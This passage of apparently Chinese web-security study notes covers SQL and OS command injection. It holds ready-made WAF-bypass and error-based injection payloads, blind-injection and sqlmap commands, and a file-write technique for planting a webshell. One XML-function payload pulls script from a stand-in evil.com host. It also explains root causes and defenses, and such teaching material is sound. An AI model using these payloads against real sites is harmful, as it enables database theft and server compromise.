`sleep()` ==> `benchmark()`

`concat_ws()` ==> `group_concat()`

`mid()`、`substr()` ==> `substring()`

`@@user` ==> `user()`

`@@datadir` ==> `datadir()`

#### <font color="yellow">009 生僻函数</font>

MySQL/PostgreSQL支持XML函数：`Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);`

`?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))`

`SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql`

`?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));`

`and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))`

`and extractvalue(1, concat(0x5c, (select user()),0x5c))`

#### <font color="yellow">010 反引号绕过</font>

``select `version()` ``，可以用来过空格和正则，特殊情况下还可以将其做注释符用

#### <font color="yellow">011 宽字符绕过</font>

宽字节绕过主要是sql数据库编码问题造成的，在过滤单引号时，可以尝试用

`%bf%27 %df%27 %aa%27`

#### <font color="yellow">012 \n绕过</font>

\n相当于NULL字符

`select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0`

`select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0`

`select * from users where id=\nunion select 1,2,3,4,5,6,7,8,9,0`

#### <font color="yellow">013 特殊字符绕过</font>

##### <font color="yellow">0001 greatest()绕过<></font>

`select greatest(ascii(mid(user(),1,1)),150)=150;`

##### <font color="yellow">0002 mid()等绕过，</font>

`mid(user() from 1 for 1)`

`substr(user() from 1 for 1)`

`select ascii(substr(user() from 1 for 1)) < 150;`

##### <font color="yellow">0003 php中创建等waf绕过、</font>

php过滤直接用`preg_match('/('.waf.')/i',$id)`

###### <font color="yellow">a. 过滤and or</font>

> `waf = 'and|or'`
> 
> 过滤代码 `1 or 1=1`   `1 and 1=1`
> 
> 绕过方式 `1 || 1=1`   `1 && 1=1`

###### </font color="yellow">b. 过滤union</font>

> `waf = 'and|or|union'`
> 
> 过滤代码 `union select user,password from users`
> 
> 绕过方式 `1 && (select user from users where userid=1)='admin'`

###### </font color="yellow">c. 过滤where</font>

> `waf = 'and|or|union|where'`
> 
> 过滤代码 `1 && (select user from users where user_id = 1) = 'admin'`
> 
> 绕过方式 `1 && (select user from users limit 1) = 'admin'`

###### </font color="yellow">d. 过滤limit</font>

> `waf = 'and|or|union|where|limit'`
> 
> 过滤代码 `1 && (select user from users limit 1) = 'admin'`
> 
> 绕过方式 `1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin`

###### </font color="yellow">e. 过滤group by</font>

> `waf = 'and|or|union|where|limit|group by'`
> 
> 过滤代码 `1 && (select user from users group by user_id having user_id = 1) = 'admin'`
> 
> 绕过方式 `1 && (select substr(group_concat(user_id),1,1) user from users ) = 1`

###### </font color="yellow">f. 过滤select</font>

> `waf = 'and|or|union|where|limit|group by|select'`
> 
> 过滤代码 `1 && (select substr(group_concat(user_id),1,1) user from users ) = 1`
> 
> 绕过方式 `1 && substr(user,1,1) = 'a'`

###### </font color="yellow">g. 过滤'</font>

> `waf = 'and|or|union|where|limit|group by|select|\''`
> 
> 过滤代码 `1 && substr(user,1,1) = 'a'`
> 
> 绕过方式 `1 && user_id is not null    1 && substr(user,1,1) = 0x61    1 && substr(user,1,1) = unhex(61)`

###### </font color="yellow">h. 过滤hex</font>

> `waf = 'and|or|union|where|limit|group by|select|\'|hex'`
> 
> 过滤代码 `1 && substr(user,1,1) = unhex(61)`
> 
> 绕过方式 `1 && substr(user,1,1) = lower(conv(11,10,16)) `

###### </font color="yellow">i. 过滤substr</font>

> `waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'`
> 
> 过滤代码 `1 && substr(user,1,1) = lower(conv(11,10,16)) `
> 
> 绕过方式 `1 && lpad(user(),1,1) in 'r'`

#### <font color="yellow">014 SQL注入简介</font>

SQL注入攻击是通过将恶意的SQL查询或添加语句插入到应用的输入参数中，再在后台SQL服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一

#### <font color="yellow">015 Web程序三层架构</font>

三层架构(3-tier architecture)通常意义上就是将整个业务应用划分为一下三个层面

- 界面层(User Interface layer)
- 业务逻辑层(Business Logic Layer)
- 数据访问层(Data access layer)

区分层次的目的即为了高内聚低耦合的思想

在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发

由数据库驱动的Web应用程序依从三层架构的思想也分为了以下三层

- 表示层
- 业务逻辑层(又称领域层)
- 数据访问层(又称存储层)

用户访问实验楼主页进行了如下过程

- 在Web浏览器中输入www.shiyanlou.com连接到实验楼服务器
- 业务逻辑层的Web服务器从本地存储中加载index.php脚本并解析
- 脚本连接位于数据访问层的DBMS(数据库管理系统)，并执行SQL语句
- 数据访问层的数据库管理系统返回SQL语句执行结果给Web服务器
- 业务逻辑层的Web服务器将Web页面封装成HTML格式发送给表示层的Web浏览器
- 表示层的Web浏览器解析HTML文件，将内容展示给用户

在三层架构中，所有通信都必须要经过中间层，简单地说，三层架构是一种线性关系

#### <font color="yellow">016 SQL注入漏洞详解</font>

SQL注入产生原因及威胁：Web服务器会向数据访问层发起SQL查询请求，如果权限验证通过就会执行SQL语句，这种网站内部直接发送的Sql请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险

SQL注入带来的威胁主要有以下几点

- 猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息
- 绕过认证，列如绕过验证登录网站后台
- 注入可以借助数据库的存储过程进行提权等操作

#### <font color="yellow">017 判断SQL注入点</font>

通常情况下，可能存在SQL注入漏洞的URL是类似这种形式`http://xxx.xxx.xxx/abcd.php?id=XX`

对SQL注入的判断，主要有两个方面

- 判断该带参数的URL是否存在SQL注入
- 如果存在SQL注入，那么属于哪种SQL注入

可能存在SQL注入攻击的ASP/PHP/JSP动态网页中，一个动态网页中可能只有一个参数，有时可能有多个参数

有时是整型参数，有时是字符串型参数，不能一概而论

总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入

如果程序员没有足够的安全意识，没有进行必要的字符过滤，存在SQL注入的可能性就非常大

判断是否存在SQL注入漏洞

> ```
> http://xxx/abc.php?id=1'
> ```
> 
> 如果页面返回错误，则存在SQL注入
> 
> 原因是无论字符型还是整型都会因为单引号个数不匹配而报错
> 
> 如果未报错，不代表不存在SQL注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入

判断SQL注入漏洞的类型

通常SQL注入漏洞分为2种类型

- 数字型
- 字符型

其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分常用的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型

OS注入

调用OS命令引起的安全隐患：Web开发所使用的编程语言中，大多数都能通过Shell执行OS(操作系统)命令，通过Shell执行OS命令时，或者开发中用到的某个方法其内部利用了Shell时，就有可能出现OS命令被任意执行的情况，这种现象被称为OS命令注入

安全隐患产生的原因：内部调用OS命令的函数以及系统调用(System Call)中，多数都通过Shell来启动命令，Shell是用来操作OS的命令行界面，如Windows中的cmd.exe、Unix系的OS中的sh、bash、csh等，通过Shell来启动命令，能够使用管道命令(Pipe)或重定向等功能的使用变的更加便捷，`system(“echo hell > a.txt”);`PHP中调用system函数，实际启动的命令，通过sh调用命令，然而，Shell提供的便利功能却会称为OS命令注入漏洞产生的根源，Shell提供了一次启动多个命令的语法，因此外界就可以在参数中做手脚，使得在原来的命令的基础上又有其他的命令被启动

在Shell中执行多条命令

shell提供了通过制定1行来启动多个程序的方法，而OS命令注入攻击就恶意利用了Shell能够启动多个程序的特性

```shell
$ echo aaa ； echo bbb#利用分号；连续执行多条命令
aaa
bbb
$ echo aaa & echo bbb#在后台和前台执行多条命令
aaa
bbb
[1] + Done echo aaa
$echo aaa && echo bbb#利用&&,如果第1个命令执行成功就执行第2个命令
aaa
bbb
$ cat aaa || echo bbb#利用||，如果第1个命令执行失败就执行第2个命令
cat: aaa:NO such file or directory
bbb
$wc `ls`#将倒引号中的字符作为命令执行
$ echo aaa | wc #利用管道符，将第一个命令的输出作为第二个命令的输入
```

Shell中的元字符：Windows的cmd.exe中能够使用&来连续执行多条命令，另外`|`(管道功能)、`&&`或`||`的用法也和Unix、Linux一样，Shell中拥有特殊意义的字符(如`；`、`|`等)被称为shell的元字符，把元字符当做普通字符使用时需要对其进行转义，而如果在指定OS命令参数的字符串中混入了SHell的元字符，就会使得攻击者添加的OS命令被执行，这也就是OS命令注入漏洞产生的原因

安全隐患的产生的原因总结：Web应用的开发语言中，有些函数的内部实现利用了Shell，如果开发者使用了这些内部调用Shell的函数，就可能会使得意料之外的OS命令被执行，这种状态被称为OS命令注入漏洞，OS命令注入漏洞的形成需要同时满足以下三个条件

- 使用了内部调用Shell的函数(system、open等)
- 将倍加传入的参数传递给内部调用的shell的函数
- 参数中shell的元字符没有被转义

解决对策：为了防范OS命令注入漏洞，有以下三种推荐方式

- 选择不调用OS命令的实现方法：不调用利用shell的功能，既能杜绝了OS命令注入漏洞混入的可能性，又消除了调用OS命令的而系统开销，能够从多方面提高应用的性能
- 不将外界输入的字符串传递给命令行参数
- 使用安全的函数对传递给OS命令参数进行转义

#### <font color="yellow">018 SQL注入</font>

注入攻击是Web安全领域中一种最为常见的攻击方式，XSS的本质相当于针对HTML的注入攻击，以及安全世界观中的数据与代码分离原则就是为了解决注入攻击而产生的

注入攻击的条件

- 用户能够控制输入
- 原本程序要执行的代码中拼接了用户输入的数据

SQL注入第一次出现在黑客rfp发布的一篇题为NT Web Technology Vulnerabilities的文章[http://www.phrack.org/issues.html?issue=54&id=8#article](http://www.phrack.org/issues.html?issue=54&id=8#article)

SQL注入的条件：用户能够控制输入(变量ShipCity)，原本程序要执行的代码中拼接了用户输入的数据，<font color="red">这个拼接非常重要，这个拼接导致了代码的注入</font>

在SQL注入的过程，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利

e.g.

> 攻击者在参数中输入`'`引起执行查询语句的语法错误，服务器直接返回了错误信息
> 
> 一句错误信息，可以知道服务器用什么作为数据库，查询语句的伪代码极有可能是其对应的语句
> 
> 错误回显披露了敏感信息，对于攻击者来说，构造SQL注入的语句就可以更加得心应手了

盲注(Blibd Injection)

布尔盲注

简介及场景

> 盲注的本质就是，在页面无法给我提供回显的时候的一中继续注入的手段
> 
> 在我们输入and 1或者and 0，浏览器返回给我们两个不同的页面，而我们就可以根据返回的页面来判断正确的数据信息

相关函数

`length()`函数

> `length()`函数的作用是返回字符串str的长度，以字节为单位，一个多字节字符算作多字节，这意味着，对于包含四个两字节字符的字符串，`length()`返回8，而`char_length()`返回4

`substr()`函数

> `substr()`函数从特定位置开始的字符串返回一个给定长度的子字符串
> 
> `substr()`函数有三个参数，用法为：`substr(str,pos,len)`
> 
> str参数代表待截取的字符串
> 
> pos参数代表从什么位置开始截取
> 
> len参数表示字符串截取的长度
> 
> 其他与`substr()`函数作用相似的函数有`mid()`和`substring()`函数，其用法和`substr()`函数一致

`ascii()`函数

> `ascii()`函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符

注入实现

布尔盲注用到的函数`length()`、`substr()`和`ascii()`函数

这里直接用数据库阐述原理，在实际中，如下面的例子注入点为id=1，我们已经无法使用union来直接查询，此处我们需要用到关键字and，我们知道只有and前后的条件都为真的时候，数据库才会输出结果

- 判断数据库名的长度
- 猜解数据库名
- 猜解表名
- 猜解字段
- 猜解数据

自动化工具

sqlmap注入工具

> 可以直接使用自动化工具进行注入，可以直接简单点，语句大概是`sqlmap -u http://xxx.xxx.xx.xx/xx.php?id=xx`
> 
> random随机给一个请求头，delay多少秒尝试一次，也可以使用--safe-freq(后面跟一个数字，代表每隔几次访问一次正常链接)和thread(线程)，technique可选择注入类型，dbms选择数据库，如果有防火墙可以跟上--tamper
> 
> `sqlmap -u http://xxx.xxx.xx.xx/xx.php?id=xx --random-agent --delay 3 --thread=3 --technique=B --dbms=mysql`

Burp中的爆破模块

> 直接抓取输入，`and ascii(substr(database(),1,1))=1`的数据包，放到爆破模块

但在很多时候，Web服务器关闭了错误回显，这时还有一种办法可能成功完成SQL注入

攻击者为了应对这种情况，研究出了Blibd Injection(盲注)这一技巧

盲注就是在服务器没有错误回显是完成注入攻击，服务器没有错误回显，对于攻击者来说缺少了非常重要但调试信息，所以攻击者必须找到一个方法来验证注入但SQL语句是否得到执行

最常见的盲注验证方法是构造简单条件语句，根据页面是否发生变化判断SQL语句是否得到执行，对于Web应用来说，也不会返回给用户，攻击者看到的页面结果将为空或者跳出错页面

当攻击者构造条件`and 1 = 1`时，如果页面返回正常，则说明SQL语句的`and`成功执行了那么判断id参数就是SQL注入的漏洞

盲注原理：攻击者通过简单的条件判断，再对比页面返回结果的差异，就可以判断SQL漏洞是否存在

Timing Attack

黑客TinKode在著名的安全邮件列表Full Disclosure上公布了一些他入侵mysql.com搜获得的细节

<font color="red">利用BENCHMARK()函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack</font>

#### <font color="yellow">019 数据库攻击技巧</font>

常见的攻击技巧

SQL注入是基于数据库的一种攻击，不同的数据库有着不同的功能、不同的算法和函数，因此，针对不同数据库，SQL注入的技巧也有所不同

SQL注入漏洞，仅仅可以猜解出数据库的对应版本

如下面这段Payload，如果MySQL版本是4，就会返回TRUE

```
Http://www.site.com/news.php?id=5 and substring(@@version,1,1)=4
```

如下Payload，则是利用union select来分别确认表名admin是否存在，列名passwd是否存在

```
id=5 union all select 1,2,3 from admin
id=5 union all select 1,2,passwd from admin
```

这个过程非常繁琐，所以非常有必要使用一个自动化工具来帮助完成整个过程[http://sqlmap.sourceforge.net](http://sqlmap.sourceforge.net)

在注入攻击的过程中，常常会用到一些读写文件的技巧

如MySQL中，就可以通过`LOAD_FILE()`读取系统文件，并通过`INTO DUMPFILE`写入本地文件，当然这要求当前数据库用户有读写系统相应文件或目录的权限

除了用`INTO DUMPFILE`外，还能用`INTO OUTFILE`

区别

- `DUMPFILE`适用于汇编语言，它会将目标文件写入同一行内
- `OUTFILE`适用于纯文本文件，更适合阅读(相对于`DUMPFILE`)

写入文件的技巧，经常被用于导出一个Webshel，为攻击者的进一步攻击做铺垫

因此在设计数据库安全方案时，可以禁用普通数据库用户具备操作文件的权限
